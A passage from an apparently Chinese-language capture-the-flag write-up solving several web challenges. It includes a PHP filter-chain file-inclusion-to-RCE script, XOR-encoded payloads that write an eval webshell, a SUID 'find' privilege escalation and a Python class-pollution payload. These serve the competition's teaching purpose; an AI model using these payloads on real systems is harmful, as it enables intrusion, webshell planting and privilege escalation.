class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">rand = <span class="string">&#x27;nMa3orDC2e|sso43vzOmv|3cLxYQjVCU|bfcsVjUjUc|DGUxICjb62|4agL09NVrj|vCY0Ii09gS|KEC5rjXegm|14Bl45OsHh|zgbN7myZbJ|Q67hx4uRVf|E4SQRpukkv|31A7kBmcpB|3J5Pj4Yfeb|zXfWAa86o5|5KMdsa0Uo0|btCM1eO8wo|maZNliuB1R|Y836Rhmpca|YreAYs4dbp|uK4nhxkdkw|4utkLM9gE7|TYekFoXTXJ|JSP6Hx0vyI|kzjZoBiv9R|EtQZUROvnh|HcTSaxtIXF|GmQhLWWoQ7|3PefcQupE7|Ctbc67MqB4|U55i5C09vA|ZqeKQ6yJSV|ufP5AUtnC6|yiYrEYIAgg|mHwm6SFE0K|q8PwOK5E2U|kBwsskBu0h|AlYCggPR8d|25Lmp0TH9E|2VDW4pida7|&#x27;</span>.<span class="title function_ invoke__">split</span>(<span class="string">&#x27;|&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;https://s5bwqhfkrgtcnancf0t3vxkgq.node.game.sycsec.com/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(rand)):</span><br><span class="line">    u = url + rand[i] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line">    r=requests.<span class="title function_ invoke__">get</span>(u)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span>(u)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>访问即可得flag。</p><p>​    </p><h3 id="ezrfi"><a href="#ezrfi" class="headerlink" title="ezrfi"></a>ezrfi</h3><blockquote><p>亲爱的Syclover,你能找到flag吗????</p></blockquote><p>只能读py文件，试出 <code>?file=/var/hint</code></p><p><code>secret=&quot;w5YubyBvd08gMHcwIG92MCDDlndvIE8ubyAwLjAgMC5vIMOWdjAgMHbDliBPdjAgT3fDliBvLk8gw5Z2TyAwXzAgMF9PIG8uTyAwdjAgw5ZfbyBPd28gw5Z2TyDDli5PIMOWXzAgTy5PIMOWXzAgMHbDliAwLjAgw5Z2w5Ygw5Z3MCBPdsOWIMOWdjAgT1/DliDDlnZPIMOWLk8gw5Z3MCBvd8OWIMOWLm8gTy5vIMOWXzAgMHbDliDDlndvIE93w5YgTy5vIE93TyBvX28gw5YuTyBvLm8gb3dPIMOWXzAgb3dPIMOWXzAgMHZvIG8uTyBPd8OWIE92byAwLsOWIMOWdjAgTy7DliAwLjAgMHfDliBvLsOWIG93byBvdzAgMHZvIMOWLm8gb3dPIG9fMCDDli5PIG9fbyBPd8OWIE8ubyBvdzAgw5ZfbyBvd28gw5YuMCDDlnZPIG9fTyBPLsOWIE92MCBPdzAgby7DliAwdjAgT3YwIE9fTyBvLk8gT3bDliDDlnYwIMOWXzAgw5Z3byBvd08gT19vIE93w5Ygby5PIMOWdk8gby4wIDBfMCDDll9vIG93TyBPXzAgMC7DliDDli5vIE8uTyBPdzAgT19vIMOWdjAgb3cwIMOWdjAgT18wIMOWdm8gw5Z2w5Ygw5ZfbyAwX8OWIMOWdm8gw5Z2w5YgMHcwIE92w5Ygw5YubyDDli4wIMOWLm8gb3ZvIMOWLjAgw5YuMCAwd28gb3dPIG8uTyAwd8OWIDB2MCBvd8OWIMOWdzAgw5YubyAwdzAgT1/DliBvX08gw5Z2byAg&quot;</code></p><p>base64解密得：</p><p><code>Ö.o owO 0w0 ov0 Öwo O.o 0.0 0.o Öv0 0vÖ Ov0 OwÖ o.O ÖvO 0_0 0_O o.O 0v0 Ö_o Owo ÖvO Ö.O Ö_0 O.O Ö_0 0vÖ 0.0 ÖvÖ Öw0 OvÖ Öv0 O_Ö ÖvO Ö.O Öw0 owÖ Ö.o O.o Ö_0 0vÖ Öwo OwÖ O.o OwO o_o Ö.O o.o owO Ö_0 owO Ö_0 0vo o.O OwÖ Ovo 0.Ö Öv0 O.Ö 0.0 0wÖ o.Ö owo ow0 0vo Ö.o owO o_0 Ö.O o_o OwÖ O.o ow0 Ö_o owo Ö.0 ÖvO o_O O.Ö Ov0 Ow0 o.Ö 0v0 Ov0 O_O o.O OvÖ Öv0 Ö_0 Öwo owO O_o OwÖ o.O ÖvO o.0 0_0 Ö_o owO O_0 0.Ö Ö.o O.O Ow0 O_o Öv0 ow0 Öv0 O_0 Övo ÖvÖ Ö_o 0_Ö Övo ÖvÖ 0w0 OvÖ Ö.o Ö.0 Ö.o ovo Ö.0 Ö.0 0wo owO o.O 0wÖ 0v0 owÖ Öw0 Ö.o 0w0 O_Ö o_O Övo</code></p><p>尊嘟假嘟解码：</p><p><code>Shy0JhFpsi+njV0IfFfzS44KIcwPFg312qo6gfdk0+DzcoMdSgVs15cERxpqnPJh4Y3b3i/mcbkPlHGTIA6/A8CQU8UX6j9w5HKy</code></p><p>根据提示RC4解码，key=Syclover，得：</p><p><code>文件包含逻辑是include($file.&quot;.py&quot;),你能找到flag文件位置吗??</code></p><p>参考： <a href="https://k1te.cn/2022/01/10/LFI学习/">LFI 新姿势学习</a>，使用文件包含RCE：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bhhtut26mxsa9f29ft8jg5y5p.node.game.sycsec.com/index.php&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/var/hint&quot;</span></span><br><span class="line">command = <span class="string">&quot;cat /ffffffllllag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;The PhpFFffilter 0n File-include vulnerabilities is s0 Amazing!!#@##&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EzRce"><a href="#EzRce" class="headerlink" title="EzRce"></a>EzRce</h3><blockquote><p>can you rce me??? flag中空格请用下划线替代</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>盲试waf，为无字母数字RCE，异或可用，将每个字符异或 <code>%A0</code> 得到不可见字符。</p><p><code>phpinfo();</code>：</p><p><code>?data=(%A0%A0%A0%A0%A0%A0%A0^%D0%C8%D0%C9%CE%C6%CF)();</code></p><p>看到disable_function禁用了：</p><p><code>exec,system,fwrite,passthru,popen,shell_exec,error_log,fputs,file_get_contents,assert,call_user_func,call_user_func_array,array_map,array_filter,array_reduce,get_defined_vars,getallheaders</code></p><p>读waf - <code>readgzfile(&#39;waf.php&#39;);</code>：</p><p><code>?data=(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%D2%C5%C1%C4%C7%DA%C6%C9%CC%C5)(%A0%A0%A0%A0%A0%A0%A0^%D7%C1%C6%8E%D0%C8%D0);</code></p><p>waf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[b-df-km-uw-z0-9\+\~\&#123;\&#125;]+/i&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> False;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写马 - <code>file_put_contents(&#39;2.php&#39;,&#39;&lt;?php eval($_POST[1]);&#39;);</code>：</p><p><code>?data=(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%C6%C9%CC%C5%FF%D0%D5%D4%FF%C3%CF%CE%D4%C5%CE%D4%D3)((%A0%A0%A0%A0%A0^%92%8E%D0%C8%D0),(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%9C%9F%D0%C8%D0%80%C5%D6%C1%CC%88%84%FF%F0%EF%F3%F4%FB%91%FD%89%9B));</code></p><p>蚁剑连接，<code>find / -perm -u=s -type f 2&gt;/dev/null</code> 发现 <code>/usr/bin/find</code> 有 SUID权限，</p><p>find提权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">touch abcd</span><br><span class="line">find abcd -exec cat /flag \;</span><br></pre></td></tr></table></figure><p>得flag：<code>SYC&#123;ThE_RCe is S0 Eas1ly_DD!&#125;</code></p><p>​    </p><h3 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h3><blockquote><p>can you pollute me?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> waf</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,redirect,url_for,session,render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key=<span class="string">&#x27;jjjjggggggreekchallenge202333333&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.isvip=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hhh</span>(<span class="title class_ inherited__">User</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">registered_users=[]</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;welcome.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/play&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    username=session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=username)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username=request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password=request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username == username <span class="keyword">and</span> user.password == password), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = user.username</span><br><span class="line">            session[<span class="string">&#x27;password&#x27;</span>]=user.password</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid login&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> waf(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;fuck payload!Hacker!!!&quot;</span></span><br><span class="line">            data=json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;连用户名密码都没有你注册啥呢&quot;</span></span><br><span class="line">            user=hhh()</span><br><span class="line">            merge(data,user)</span><br><span class="line">            registered_users.append(user)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;泰酷辣,没有注册成功捏&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username ==session[<span class="string">&#x27;username&#x27;</span>]  <span class="keyword">and</span> user.password == session[<span class="string">&#x27;password&#x27;</span>]), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        <span class="keyword">if</span> user.isvip:</span><br><span class="line">            data=request.args.get(<span class="string">&#x27;num&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">and</span> data != <span class="string">&quot;123456789&quot;</span> <span class="keyword">and</span> <span class="built_in">int</span>(data) == <span class="number">123456789</span> <span class="keyword">and</span> <span class="built_in">len</span>(data) &lt;=<span class="number">10</span>:</span><br><span class="line">                        flag = os.environ.get(<span class="string">&#x27;geek_flag&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>,flag=flag)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;你的数字不对哦!&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;I need a num!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&#x27;这种神功你不充VIP也想学?&lt;p&gt;&lt;img src=&quot;&#123;&#123;url_for(\&#x27;static\&#x27;,filename=\&#x27;weixin.png\&#x27;)&#125;&#125;&quot;&gt;要不v我50,我送你一个VIP吧,嘻嘻&lt;/p&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;先登录去&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;8888&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>代码中有 <code>merge()</code> 函数，参考：<a href="https://tttang.com/archive/1876/">Python原型链污染变体(prototype-pollution-in-python)</a></p><p>waf中包含 <code>isvip</code>，使用Unicode编码绕过关键字过滤。</p><p>对路由 <code>/register</code>，POST <code>&#123;&quot;username&quot;:&quot;xx&quot;,&quot;password&quot;:&quot;yy&quot;,&quot;__class__&quot; : &#123;&quot;__base__&quot; : &#123;&quot;is\u0076ip&quot; : 1&#125;&#125;&#125;</code></p><p>再登录访问 <code>/flag</code>，用 <code>+</code> 绕过判断：<code>/flag?num=+123456789</code>，查看源码得到flag。</p><p>​    </p><h3 id="ez-php"><a href="#ez-php" 